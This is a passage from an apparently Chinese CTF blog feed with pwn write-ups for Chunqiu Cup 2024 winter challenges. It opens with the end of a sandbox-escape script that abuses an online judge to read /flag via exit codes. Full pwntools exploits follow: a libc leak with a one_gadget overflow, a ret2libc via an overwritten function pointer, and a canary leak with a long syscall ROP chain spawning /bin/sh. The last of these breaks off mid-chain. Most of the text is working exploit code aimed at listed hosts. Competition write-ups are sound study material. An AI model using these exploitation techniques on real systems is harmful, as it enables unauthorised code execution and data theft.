POSIX_CALL(dup2(c2pwrite, <span class="hljs-number">1</span>));  <span class="hljs-comment">/* stdout */</span><br></code></pre></td></tr></table></figure><p>这会把子进程的<code>stdout</code>转发到<code>c2pwrite</code>上。这样，我们就可以通过<code>c2pwrite</code>参数获取子进程的输出并通过退出码逐步输出。<br>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><br>URL = <span class="hljs-string">&quot;http://121.41.238.106:42312//api/submit&quot;</span><br>CODE_TEMPLATE = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">import _posixsubprocess</span><br><span class="hljs-string">import os</span><br><span class="hljs-string">import time</span><br><span class="hljs-string">import sys</span><br><span class="hljs-string"></span><br><span class="hljs-string">std_pipe = os.pipe()</span><br><span class="hljs-string">err_pipe = os.pipe()</span><br><span class="hljs-string"></span><br><span class="hljs-string">_posixsubprocess.fork_exec(</span><br><span class="hljs-string">    (b&quot;/bin/bash&quot;,b&quot;-c&quot;,b&quot;&#123;command&#125;&quot;),</span><br><span class="hljs-string">    [b&quot;/bin/bash&quot;],</span><br><span class="hljs-string">    True,</span><br><span class="hljs-string">    (),</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    std_pipe[1], #c2pwrite</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    *(err_pipe),</span><br><span class="hljs-string">    False,</span><br><span class="hljs-string">    False,</span><br><span class="hljs-string">    False,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    False,</span><br><span class="hljs-string">)</span><br><span class="hljs-string">time.sleep(0.1)</span><br><span class="hljs-string">content = os.read(std_pipe[0],1024)</span><br><span class="hljs-string">content_len = len(content)</span><br><span class="hljs-string"></span><br><span class="hljs-string">if &#123;loc&#125; &lt; content_len:</span><br><span class="hljs-string">    sys.exit(content[&#123;loc&#125;])</span><br><span class="hljs-string">else:</span><br><span class="hljs-string">    sys.exit(255)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>command=<span class="hljs-string">&quot;cat /flag*&quot;</span><br>received = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">254</span>):<br>    code = CODE_TEMPLATE.<span class="hljs-built_in">format</span>(loc=i,command=command)<br>    data = &#123;<span class="hljs-string">&quot;problem_id&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;code&quot;</span>:code&#125;<br>    resp = requests.post(URL,json=data)<br>    resp_data = resp.json()<br>    <span class="hljs-keyword">assert</span>(resp_data[<span class="hljs-string">&quot;status&quot;</span>] == <span class="hljs-string">&quot;RE&quot;</span>)<br>    ret_loc = resp_data[<span class="hljs-string">&quot;message&quot;</span>].find(<span class="hljs-string">&quot;ret=&quot;</span>)<br>    ret_code = resp_data[<span class="hljs-string">&quot;message&quot;</span>][ret_loc+<span class="hljs-number">4</span>:]<br>    <span class="hljs-keyword">if</span> ret_code == <span class="hljs-string">&quot;255&quot;</span>:<br>        <span class="hljs-keyword">break</span><br>    received += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(ret_code))<br>    <span class="hljs-built_in">print</span>(received)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>春秋杯2024冬季赛 pwn-wp</title>
    <link href="/2025/02/26/%E6%98%A5%E7%A7%8B%E6%9D%AF2024%E5%86%AC%E5%AD%A3%E8%B5%9B-pwn-wp/"/>
    <url>/2025/02/26/%E6%98%A5%E7%A7%8B%E6%9D%AF2024%E5%86%AC%E5%AD%A3%E8%B5%9B-pwn-wp/</url>
    
    <content type="html"><![CDATA[<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>首先在本地环境调试时需要拟造一个.BYPASS文件，只要满足条件即可。<br><code>main</code>函数可以leak puts, 进而leak libc。<code>0x400978</code>处的函数可以栈溢出，但由于见0截断，只能用one_gadget打。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename = <span class="hljs-string">&quot;pwn_patched&quot;</span><br>libcname = <span class="hljs-string">&quot;/home/zhangjuncpp/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6_2.27-3ubuntu1.6_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>host = <span class="hljs-string">&quot;47.94.155.240&quot;</span><br>port = <span class="hljs-number">22636</span><br>elf = context.binary = ELF(filename)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b main</span><br><span class="hljs-string"></span><br><span class="hljs-string">b *(0x400b6b)</span><br><span class="hljs-string">set debug-file-directory /home/zhangjuncpp/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6-dbg_2.27-3ubuntu1.6_amd64/usr/lib/debug</span><br><span class="hljs-string">set directories /home/zhangjuncpp/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/glibc-source_2.27-3ubuntu1.6_all/usr/src/glibc/glibc-2.27</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br>    <span class="hljs-keyword">elif</span> args.REMOTE:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br>pop_rdi = <span class="hljs-number">0x400df3</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br><br><br>io = start()<br>io.send(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;Invalid\n&quot;</span>)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; puts: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>libc.address = puts_addr - libc.sym.puts<br>one_gadget = libc.address + <span class="hljs-number">0x4f302</span><br>system_addr = libc.address + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc.address + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; puts: <span class="hljs-subst">&#123;p16(<span class="hljs-number">526</span>+<span class="hljs-number">5</span>)&#125;</span>&quot;</span>)<br>io.send(<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">4</span>)<br>pause(<span class="hljs-number">1</span>)<br>rop_chain = p64(one_gadget)<br>str1 = (<span class="hljs-string">b&quot;KEY: &quot;</span>+ <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">19</span>+p16(<span class="hljs-number">526</span>+<span class="hljs-number">5</span>) + <span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">8</span> + rop_chain).ljust(<span class="hljs-number">512</span> ,<span class="hljs-string">b&quot;d&quot;</span>)<br>payload = (<span class="hljs-string">b&quot;VAL: &quot;</span>).ljust(<span class="hljs-number">512</span> ,<span class="hljs-string">b&quot;d&quot;</span>)<br>io.send(str1)<br>pause(<span class="hljs-number">1</span>)<br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="gender-simulation"><a href="#gender-simulation" class="headerlink" title="gender_simulation"></a>gender_simulation</h2><p>女汉子<code>Tomboy</code>选项有漏洞(为什么不是南梁选项😭)，会将接收到的字符串当做函数指针调用，篡改至<code>gender</code>函数后打ret2libc即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    author: GeekCmore</span><br><span class="hljs-string">    time: 2025-01-17 11:28:01</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename = <span class="hljs-string">&quot;pwn_patched&quot;</span><br>libcname = <span class="hljs-string">&quot;/home/zhangjuncpp/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>host = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port = <span class="hljs-number">1337</span><br>elf = context.binary = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *(0x402EA9)</span><br><span class="hljs-string">b *(0x4025e6)</span><br><span class="hljs-string">set debug-file-directory /home/zhangjuncpp/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6-dbg_2.39-0ubuntu8.3_amd64/usr/lib/debug</span><br><span class="hljs-string">set directories /home/zhangjuncpp/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/glibc-source_2.39-0ubuntu8.3_all/usr/src/glibc/glibc-2.39</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br>    <span class="hljs-keyword">elif</span> args.REMOTE:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br>io = start()<br>io.recvuntil(<span class="hljs-string">b&quot;gift: &quot;</span>)<br>gift = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>libc_base = gift - libc.sym[<span class="hljs-string">&quot;setvbuf&quot;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>log.success(<span class="hljs-string">f&quot;libc_base&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;Girl\n&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;Tomboy\n&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>back_addr = <span class="hljs-number">0x4025e6</span><br>io.sendlineafter(<span class="hljs-string">b&quot;certificate\n&quot;</span>, p64(back_addr))<br>pop_rdi = <span class="hljs-number">0x10f75b</span> + libc_base<br>ret = pop_rdi + <span class="hljs-number">1</span><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x10</span> + <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)<br>io.sendafter(<span class="hljs-string">b&quot;certificate&quot;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="eazy-http"><a href="#eazy-http" class="headerlink" title="eazy_http"></a>eazy_http</h2><p>本题主要难点是逆向，pwn漏洞点属于签到题级别，我觉得这题应该出RE()<br>注意到不仅没给libc，甚至整个程序都没有plt表和got表。这实际上是因为程序直接重写了libc的函数并写死在程序里，然后剥离符号表，提高了逆向难度。<br>逆向分析部分参考这位大佬的题解：<a href="https://xz.aliyun.com/news/16600">https://xz.aliyun.com/news/16600</a><br>不过我调试时一直只有一个进程，与上述题解情况不同，可能是我的环境问题吧。<br>漏洞点是栈溢出。注意，程序实际上是有canary保护的，需要常规方法泄露canary后再打一次。由于缺失libc，这里的ROP需要利用syscall打，ROP链很长，但基本不用自己写，<strong>ROPgadget一把梭即可</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./attachment --ropchain<br></code></pre></td></tr></table></figure><p>这里还有一个问题，在解析路径时会把路径存到栈上，可我们的ROP部分毁坏了栈，需要弄个长点的pop绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> subprocess<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br><br>e = ELF(<span class="hljs-string">&quot;./attachment&quot;</span>)<br><br>io = process(<span class="hljs-string">&quot;./attachment&quot;</span>)<br><span class="hljs-comment"># io = gdb.debug(&quot;./attachment&quot;, &quot;&quot;&quot;b *(0x40218f)</span><br><span class="hljs-comment">#                b *(0x401f71)</span><br><span class="hljs-comment">#                b *(0x401bd1)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br><br>template = <span class="hljs-string">&#x27;&#x27;&#x27;POST /&#123;&#125; HTTP/1.1\r</span><br><span class="hljs-string">Host: www.baidu.com\r</span><br><span class="hljs-string">User-Agent: Haha\r</span><br><span class="hljs-string">Content-Length: &#123;&#125;\r</span><br><span class="hljs-string">Content: &#123;&#125;\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    command = [<span class="hljs-string">&quot;ps&quot;</span>, <span class="hljs-string">&quot;-ax&quot;</span>]<br>    grep_command = [<span class="hljs-string">&quot;grep&quot;</span>, <span class="hljs-string">&quot;attachment&quot;</span>]<br>    <span class="hljs-comment"># 执行 ps 命令</span><br>    ps_process = subprocess.Popen(command, stdout=subprocess.PIPE)<br>    <span class="hljs-comment"># 将 ps 命令的输出作为 grep 命令的输入</span><br>    grep_process = subprocess.Popen(grep_command, stdin=ps_process.stdout, stdout=subprocess.PIPE)<br>    <span class="hljs-comment"># 允许 ps 命令的输出流直接传递到 grep 命令</span><br>    ps_process.stdout.close()<br>    <span class="hljs-comment"># 获取最终输出   </span><br>    output = grep_process.communicate()[<span class="hljs-number">0</span>]<br>    pid=<span class="hljs-built_in">int</span>(output.decode().split()[<span class="hljs-number">5</span>],<span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;pid:<span class="hljs-subst">&#123;pid&#125;</span>&quot;</span>)<br>    attach(pid)<br>    pause()<br>    <br>payload1=template.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;show&quot;</span>, <span class="hljs-number">0x109</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x109</span>).encode()<br><br><span class="hljs-comment"># debug()</span><br><span class="hljs-comment"># pause()</span><br>io.send(payload1)<br>io.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x108</span>)<br>canary = u64(io.recv(<span class="hljs-number">8</span>)) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;a&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;canary:<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&quot;</span>)<br><br>bss = <span class="hljs-number">0x4e8b70</span><br><br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>pop_r12_r13_r14_r15_rbp=<span class="hljs-number">0x000000000040545d</span><br>p=p64(pop_r12_r13_r14_r15_rbp)+(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x15</span> + <span class="hljs-string">b&#x27;/add\x00&#x27;</span>).ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a9ee</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e0</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000459227</span>) <span class="hljs-comment"># pop rax ; ret</span><br>p += <span class="hljs-string">b&#x27;/bin//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000045b995</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a9ee</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000447279</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000045b995</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040297f</span>) <span class="hljs-comment"># pop rdi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e0</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a9ee</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004a4c4b</span>) <span class="hljs-comment"># pop rdx ; pop rbx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x4141414141414141</span>) <span class="hljs-comment"># padding</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000447279</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span 